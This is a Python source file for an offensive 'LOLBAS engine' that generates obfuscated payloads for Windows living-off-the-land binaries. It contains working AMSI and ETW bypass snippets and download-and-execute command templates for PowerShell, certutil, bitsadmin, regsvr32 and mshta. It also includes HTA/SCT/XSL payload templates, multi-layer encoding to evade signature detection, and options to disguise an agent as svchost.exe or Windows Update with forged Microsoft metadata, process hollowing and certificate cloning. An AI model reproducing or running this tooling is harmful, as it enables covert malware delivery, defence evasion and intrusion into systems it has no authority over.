"""
Advanced LOLBAS Engine with Comprehensive Signature Evasion
Enhanced obfuscation and modern AMSI/ETW bypass techniques
"""

import json
import random
import hashlib
import base64
import os
import string
import re
import zlib
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime

class AdvancedLolbasEngine:
    """Next-generation LOLBAS engine with advanced evasion capabilities"""
    
    def __init__(self):
        self.techniques = {}
        self.obfuscation_patterns = {}
        self.amsi_bypasses = {}
        self.etw_bypasses = {}
        self.signature_evasion = {}
        self.encoding_methods = {}
        self.load_advanced_techniques()
        self.load_signature_evasion()
        self.load_encoding_methods()
        
    def load_advanced_techniques(self):
        """Load comprehensive LOLBAS techniques with modern bypasses"""
        self.techniques = {
            "execution": {
                "powershell": {
                    "binary": "powershell.exe",
                    "variants": ["pwsh.exe", "powershell_ise.exe", "PowerShell_ISE.exe"],
                    "methods": {
                        "direct": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{command}\"",
                        "encoded": "powershell.exe -EncodedCommand {encoded_command}",
                        "stdin": "echo {command} | powershell.exe -",
                        "download_exec": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('{url}')\"",
                        "reflection": "powershell.exe -Command \"[Reflection.Assembly]::Load([Convert]::FromBase64String('{b64_assembly}')).EntryPoint.Invoke($null,@(,@()))\"",
                        "compressed": "powershell.exe -Command \"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{compressed_b64}')))\""
                    },
                    "obfuscation": {
                        "variable_names": ["$a", "$b", "$c", "$x", "$y", "$z", "$data", "$result", "$temp"],
                        "string_concat": ["'{0}'+'{1}'", "\"{0}\"+\"{1}\"", "'{0}'{1}"],
                        "char_codes": "([char]({0}))+([char]({1}))",
                        "base64_chunks": True,
                        "gzip_compression": True
                    }
                },
                "wmic": {
                    "binary": "wmic.exe",
                    "variants": ["wmic.exe"],
                    "methods": {
                        "process_create": "wmic process call create \"{command}\"",
                        "remote_exec": "wmic /node:\"{target}\" /user:\"{user}\" /password:\"{pass}\" process call create \"{command}\"",
                        "xsl_exec": "wmic os get /format:\"{xsl_file}\"",
                        "alias_exec": "wmic aliases list brief",
                        "service_exec": "wmic service where name='{service}' call startservice"
                    },
                    "xsl_templates": {
                        "basic": """<?xml version='1.0'?><stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder"><output method="text"/><ms:script implements-prefix="user" language="JScript"><![CDATA[{jscript_payload}]]></ms:script></stylesheet>""",
                        "obfuscated": """<?xml version='1.0'?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts"><xsl:output method="html"/><msxsl:script language="JScript" implements-prefix="user"><![CDATA[{obfuscated_jscript}]]></msxsl:script><xsl:template match="/"><xsl:value-of select="user:exec()"/></xsl:template></xsl:stylesheet>"""
                    }
                },
                "rundll32": {
                    "binary": "rundll32.exe",
                    "variants": ["rundll32.exe"],
                    "methods": {
                        "javascript": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";{js_payload}",
                        "shell_exec": "rundll32.exe shell32.dll,ShellExec_RunDLL {target}",
                        "url_exec": "rundll32.exe url.dll,FileProtocolHandler {url}",
                        "advpack": "rundll32.exe advpack.dll,LaunchINFSection {inf_file}",
                        "ieadvpack": "rundll32.exe ieadvpack.dll,LaunchINFSection {url},{section}",
                        "pcwutl": "rundll32.exe pcwutl.dll,LaunchApplication {command}",
                        "setupapi": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 {inf_file}"
                    }
                },
                "regsvr32": {
                    "binary": "regsvr32.exe",
                    "variants": ["regsvr32.exe"],
                    "methods": {
                        "scrobj": "regsvr32.exe /s /n /u /i:{url} scrobj.dll",
                        "silent": "regsvr32.exe /u /s {dll}",
                        "remote": "regsvr32.exe /s /n /u /i:http://{server}/{file}.sct scrobj.dll"
                    },
                    "sct_templates": {
                        "basic": """<?XML version="1.0"?><scriptlet><registration description="{desc}" progid="{progid}" version="1.00" classid="{classid}"></registration><script language="JScript"><![CDATA[{jscript}]]></script></scriptlet>""",
                        "com_hijack": """<?XML version="1.0"?><scriptlet><registration description="Bypasses AMSI" progid="Bypass.AMSI" version="1.00" classid="{F0001111-0000-0000-0000-0000FEEDACDC}"><script language="JScript"><![CDATA[{payload}]]></script></registration></scriptlet>"""
                    }
                },
                "mshta": {
                    "binary": "mshta.exe",
                    "variants": ["mshta.exe"],
                    "methods": {
                        "hta_exec": "mshta.exe {hta_file}",
                        "javascript": "mshta.exe javascript:{js_payload};close();",
                        "vbscript": "mshta.exe vbscript:{vbs_payload}",
                        "remote_hta": "mshta.exe http://{server}/{file}.hta"
                    },
                    "hta_templates": {
                        "minimal": """<html><head><HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize"></head><body><script language="javascript">{payload}</script></body></html>""",
                        "stealth": """<html><head><HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize" NAVIGABLE="no" SCROLL="no"></head><body><script language="VBScript">{vbs_payload}</script></body></html>"""
                    }
                },
                "certutil": {
                    "binary": "certutil.exe",
                    "variants": ["certutil.exe"],
                    "methods": {
                        "decode_exec": "certutil.exe -decode {encoded_file} {output_file} && {output_file}",
                        "url_download": "certutil.exe -urlcache -split -f {url} {output_file}",
                        "ping": "certutil.exe -ping {target}",
                        "encode": "certutil.exe -encode {input_file} {output_file}"
                    }
                },
                "bitsadmin": {
                    "binary": "bitsadmin.exe",
                    "variants": ["bitsadmin.exe"],
                    "methods": {
                        "download_exec": "bitsadmin.exe /transfer {job_name} {url} {local_file} && {local_file}",
                        "priority": "bitsadmin.exe /transfer {job_name} /priority high {url} {local_file}",
                        "create_job": "bitsadmin.exe /create {job_name} && bitsadmin.exe /addfile {job_name} {url} {local_file}"
                    }
                },
                "schtasks": {
                    "binary": "schtasks.exe",
                    "variants": ["schtasks.exe"],
                    "methods": {
                        "create_run": "schtasks.exe /create /tn \"{task_name}\" /tr \"{command}\" /sc once /st {time} /f && schtasks.exe /run /tn \"{task_name}\"",
                        "xml_import": "schtasks.exe /create /xml {xml_file} /tn \"{task_name}\"",
                        "remote": "schtasks.exe /create /s {target} /u {user} /p {pass} /tn \"{task_name}\" /tr \"{command}\" /sc once /st {time}"
                    }
                },
                "forfiles": {
                    "binary": "forfiles.exe",
                    "variants": ["forfiles.exe"],
                    "methods": {
                        "exec": "forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c {command}",
                        "bypass": "forfiles.exe /p c:\\windows\\system32 /m cmd.exe /c \"{command}\""
                    }
                },
                "pcalua": {
                    "binary": "pcalua.exe",
                    "variants": ["pcalua.exe"],
                    "methods": {
                        "exec": "pcalua.exe -a {executable}",
                        "params": "pcalua.exe -a {executable} -c {args}"
                    }
                }
            }
        }
    
    def load_signature_evasion(self):
        """Load advanced signature evasion techniques"""
        self.signature_evasion = {
            "amsi_bypasses": {
                "reflection_patch": """
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$x = @(0);[System.Runtime.InteropServices.Marshal]::Copy($x, 0, $ptr, 1)
                """,
                "com_bypass": """
$w = New-Object -ComObject Excel.Application; $w.DDEInitiate('cmd', '/c {command}')
                """,
                "memory_patch": """
[System.Runtime.InteropServices.Marshal]::Copy(@(0x41, 0x4d, 0x53, 0x49), 0, [ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').GetValue($null), 4)
                """,
                "string_obfuscation": """
${''.GetType().Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}
                """
            },
            "etw_bypasses": {
                "provider_disable": """
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
                """,
                "patch_method": """
$p=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetMethod('WriteEvent', 'NonPublic,Static', $null, @([System.Diagnostics.Eventing.EventDescriptor], [System.Object[]]), $null); $p.Invoke($null, @([System.Diagnostics.Eventing.EventDescriptor]::new(0,0,0,0,0,0,0), @($null)))
                """
            },
            "string_obfuscation": {
                "base64_layers": 3,
                "xor_encoding": True,
                "compression": ["gzip", "deflate"],
                "variable_substitution": True,
                "char_substitution": True,
                "format_strings": True
            },
            "execution_obfuscation": {
                "invoke_expression": ["IEX", "Invoke-Expression", "&", ".", "Invoke-Command"],
                "cmdlet_aliases": {
                    "Invoke-WebRequest": ["iwr", "wget", "curl"],
                    "New-Object": ["New"],
                    "Get-Content": ["gc", "cat", "type"],
                    "Set-Content": ["sc"],
                    "Out-File": ["write"]
                },
                "parameter_obfuscation": True,
                "splatting": True
            }
        }
    
    def load_encoding_methods(self):
        """Load various encoding and obfuscation methods"""
        self.encoding_methods = {
            "base64": {
                "encoder": lambda x: base64.b64encode(x.encode()).decode(),
                "decoder": lambda x: base64.b64decode(x).decode(),
                "chunked": True
            },
            "hex": {
                "encoder": lambda x: '0x' + ''.join(f'{ord(c):02x}' for c in x),
                "decoder": lambda x: ''.join(chr(int(x[i:i+2], 16)) for i in range(2, len(x), 2))
            },
            "ascii": {
                "encoder": lambda x: '+'.join(str(ord(c)) for c in x),
                "decoder": lambda x: ''.join(chr(int(i)) for i in x.split('+'))
            },
            "gzip_base64": {
                "encoder": lambda x: base64.b64encode(zlib.compress(x.encode())).decode(),
                "decoder": lambda x: zlib.decompress(base64.b64decode(x)).decode()
            },
            "xor": {
                "encoder": lambda x, key=42: base64.b64encode(bytes([ord(c) ^ key for c in x])).decode(),
                "decoder": lambda x, key=42: ''.join(chr(b ^ key) for b in base64.b64decode(x))
            }
        }
    
    def generate_obfuscated_payload(self, payload: str, technique: str = "powershell", 
                                  obfuscation_level: int = 3) -> Dict[str, Any]:
        """Generate heavily obfuscated payload with multiple evasion layers"""
        
        result = {
            "original_payload": payload,
            "technique": technique,
            "obfuscation_level": obfuscation_level,
            "evasion_methods": [],
            "final_payload": "",
            "execution_command": "",
            "auxiliary_files": {}
        }
        
        # Apply AMSI bypass if PowerShell
        if technique == "powershell":
            payload = self._apply_amsi_bypass(payload)
            result["evasion_methods"].append("AMSI Bypass")
            
            # Apply ETW bypass
            payload = self._apply_etw_bypass(payload)
            result["evasion_methods"].append("ETW Bypass")
        
        # Apply encoding layers
        encoded_payload = self._apply_encoding_layers(payload, obfuscation_level)
        result["evasion_methods"].extend(encoded_payload["methods"])
        
        # Generate technique-specific execution
        execution_result = self._generate_technique_execution(
            encoded_payload["payload"], technique, obfuscation_level
        )
        
        result.update(execution_result)
        
        return result
    
    def _apply_amsi_bypass(self, payload: str) -> str:
        """Apply AMSI bypass techniques"""
        bypass_methods = list(self.signature_evasion["amsi_bypasses"].values())
        selected_bypass = random.choice(bypass_methods)
        
        # Obfuscate the bypass itself
        obfuscated_bypass = self._obfuscate_powershell_string(selected_bypass.strip())
        
        return f"{obfuscated_bypass}; {payload}"
    
    def _apply_etw_bypass(self, payload: str) -> str:
        """Apply ETW bypass techniques"""
        bypass_methods = list(self.signature_evasion["etw_bypasses"].values())
        selected_bypass = random.choice(bypass_methods)
        
        obfuscated_bypass = self._obfuscate_powershell_string(selected_bypass.strip())
        
        return f"{obfuscated_bypass}; {payload}"
    
    def _apply_encoding_layers(self, payload: str, layers: int) -> Dict[str, Any]:
        """Apply multiple encoding layers for signature evasion"""
        current_payload = payload
        methods_used = []
        
        encoding_sequence = ["xor", "gzip_base64", "base64", "ascii", "hex"]
        selected_encodings = random.sample(encoding_sequence, min(layers, len(encoding_sequence)))
        
        for encoding in selected_encodings:
            if encoding in self.encoding_methods:
                encoder = self.encoding_methods[encoding]["encoder"]
                if encoding == "xor":
                    key = random.randint(1, 255)
                    current_payload = encoder(current_payload, key)
                    methods_used.append(f"XOR (key: {key})")
                else:
                    current_payload = encoder(current_payload)
                    methods_used.append(encoding.upper())
        
        return {
            "payload": current_payload,
            "methods": methods_used,
            "layers": layers
        }
    
    def _obfuscate_powershell_string(self, text: str) -> str:
        """Advanced PowerShell string obfuscation"""
        # Variable name randomization
        var_name = f"${random.choice(string.ascii_lowercase)}{random.randint(100, 999)}"
        
        # String concatenation obfuscation
        if len(text) > 20:
            # Split into chunks and concatenate
            chunk_size = random.randint(5, 15)
            chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
            obfuscated_chunks = []
            
            for chunk in chunks:
                # Random encoding method for each chunk
                if random.choice([True, False]):
                    # Base64 encode chunk
                    encoded = base64.b64encode(chunk.encode()).decode()
                    obfuscated_chunks.append(f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'))")
                else:
                    # Character code concatenation
                    char_codes = '+'.join(f"[char]{ord(c)}" for c in chunk)
                    obfuscated_chunks.append(f"({char_codes})")
            
            return f"{var_name}=({'+'.join(obfuscated_chunks)}); IEX {var_name}"
        else:
            # Simple character code obfuscation
            char_codes = '+'.join(f"[char]{ord(c)}" for c in text)
            return f"IEX ({char_codes})"
    
    def _generate_technique_execution(self, payload: str, technique: str, 
                                    obfuscation_level: int) -> Dict[str, Any]:
        """Generate technique-specific execution commands"""
        
        if technique not in self.techniques["execution"]:
            raise ValueError(f"Unknown technique: {technique}")
        
        tech_config = self.techniques["execution"][technique]
        result = {
            "final_payload": payload,
            "execution_command": "",
            "auxiliary_files": {}
        }
        
        if technique == "powershell":
            # Choose random execution method
            method = random.choice(list(tech_config["methods"].keys()))
            
            if method == "encoded":
                # Base64 encode the entire command
                encoded_cmd = base64.b64encode(payload.encode('utf-16le')).decode()
                result["execution_command"] = tech_config["methods"][method].format(
                    encoded_command=encoded_cmd
                )
            elif method == "compressed":
                # Compress and encode
                compressed = zlib.compress(payload.encode())
                b64_compressed = base64.b64encode(compressed).decode()
                result["execution_command"] = tech_config["methods"][method].format(
                    compressed_b64=b64_compressed
                )
            else:
                result["execution_command"] = tech_config["methods"][method].format(
                    command=payload
                )
        
        elif technique == "wmic":
            # Generate XSL file for advanced execution
            if obfuscation_level >= 2:
                xsl_content = self._generate_obfuscated_xsl(payload)
                xsl_filename = f"temp_{random.randint(1000, 9999)}.xsl"
                result["auxiliary_files"][xsl_filename] = xsl_content
                result["execution_command"] = tech_config["methods"]["xsl_exec"].format(
                    xsl_file=xsl_filename
                )
            else:
                result["execution_command"] = tech_config["methods"]["process_create"].format(
                    command=payload
                )
        
        elif technique == "rundll32":
            # Generate JavaScript payload
            if obfuscation_level >= 2:
                js_payload = self._obfuscate_javascript(payload)
                result["execution_command"] = tech_config["methods"]["javascript"].format(
                    js_payload=js_payload
                )
            else:
                result["execution_command"] = tech_config["methods"]["shell_exec"].format(
                    target=payload
                )
        
        elif technique == "regsvr32":
            # Generate SCT file
            sct_content = self._generate_obfuscated_sct(payload)
            sct_filename = f"temp_{random.randint(1000, 9999)}.sct"
            result["auxiliary_files"][sct_filename] = sct_content
            result["execution_command"] = tech_config["methods"]["scrobj"].replace(
                "{url}", sct_filename
            )
        
        elif technique == "mshta":
            # Generate HTA file
            hta_content = self._generate_obfuscated_hta(payload)
            hta_filename = f"temp_{random.randint(1000, 9999)}.hta"
            result["auxiliary_files"][hta_filename] = hta_content
            result["execution_command"] = tech_config["methods"]["hta_exec"].format(
                hta_file=hta_filename
            )
        
        return result
    
    def _generate_obfuscated_xsl(self, payload: str) -> str:
        """Generate obfuscated XSL file"""
        obfuscated_js = self._obfuscate_javascript(payload)
        template = self.techniques["execution"]["wmic"]["xsl_templates"]["obfuscated"]
        
        return template.format(
            obfuscated_jscript=obfuscated_js
        )
    
    def _generate_obfuscated_sct(self, payload: str) -> str:
        """Generate obfuscated SCT file"""
        obfuscated_js = self._obfuscate_javascript(payload)
        template = self.techniques["execution"]["regsvr32"]["sct_templates"]["com_hijack"]
        
        return template.format(
            payload=obfuscated_js
        )
    
    def _generate_obfuscated_hta(self, payload: str) -> str:
        """Generate obfuscated HTA file"""
        # Convert PowerShell to VBScript equivalent
        vbs_payload = self._convert_to_vbscript(payload)
        template = self.techniques["execution"]["mshta"]["hta_templates"]["stealth"]
        
        return template.format(
            vbs_payload=vbs_payload
        )
    
    def _obfuscate_javascript(self, payload: str) -> str:
        """Advanced JavaScript obfuscation"""
        # Encode payload
        encoded = base64.b64encode(payload.encode()).decode()
        
        # Generate obfuscated decoder
        var_names = [f"_{random.choice(string.ascii_lowercase)}{random.randint(10, 99)}" for _ in range(3)]
        
        js_code = f"""
        var {var_names[0]} = "{encoded}";
        var {var_names[1]} = function(s) {{
            return atob(s);
        }};
        var {var_names[2]} = new ActiveXObject("WScript.Shell");
        {var_names[2]}.Run({var_names[1]}({var_names[0]}), 0, false);
        """
        
        return js_code.replace('\n', '').replace('  ', '')
    
    def _convert_to_vbscript(self, powershell_payload: str) -> str:
        """Convert PowerShell payload to VBScript equivalent"""
        # Basic conversion for simple commands
        vbs_template = f"""
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell.exe -WindowStyle Hidden -Command \\"{powershell_payload}\\"", 0, False
        """
        
        return vbs_template.strip()
    
    def generate_agent_compilation_options(self, payload: str) -> Dict[str, Any]:
        """Generate various agent compilation and disguise options"""
        
        options = {
            "standard_exe": {
                "name": "agent.exe",
                "payload": payload,
                "compilation": "standard"
            },
            "update_exe": {
                "name": "update.exe", 
                "payload": payload,
                "compilation": "disguised",
                "icon": "system_update.ico",
                "version_info": {
                    "CompanyName": "Microsoft Corporation",
                    "FileDescription": "Windows Update Service",
                    "FileVersion": "10.0.19041.1",
                    "ProductName": "Microsoft Windows",
                    "ProductVersion": "10.0.19041.1"
                }
            },
            "svchost_exe": {
                "name": "svchost.exe",
                "payload": payload, 
                "compilation": "system_mimic",
                "icon": "system_service.ico",
                "version_info": {
                    "CompanyName": "Microsoft Corporation", 
                    "FileDescription": "Host Process for Windows Services",
                    "FileVersion": "10.0.19041.1",
                    "ProductName": "Microsoft Windows"
                }
            },
            "legitimate_app": {
                "name": "notepad.exe",
                "payload": payload,
                "compilation": "hollow_process",
                "target_process": "notepad.exe",
                "injection_method": "process_hollowing"
            },
            "dll_sideload": {
                "name": "version.dll",
                "payload": payload,
                "compilation": "dll_proxy",
                "target_dll": "version.dll",
                "proxy_functions": ["GetFileVersionInfoA", "GetFileVersionInfoW"]
            },
            "signed_binary": {
                "name": "MicrosoftEdgeUpdate.exe",
                "payload": payload,
                "compilation": "certificate_clone",
                "certificate_source": "Microsoft Corporation"
            }
        }
        
        return options

# Global instance
advanced_lolbas_engine = AdvancedLolbasEngine()
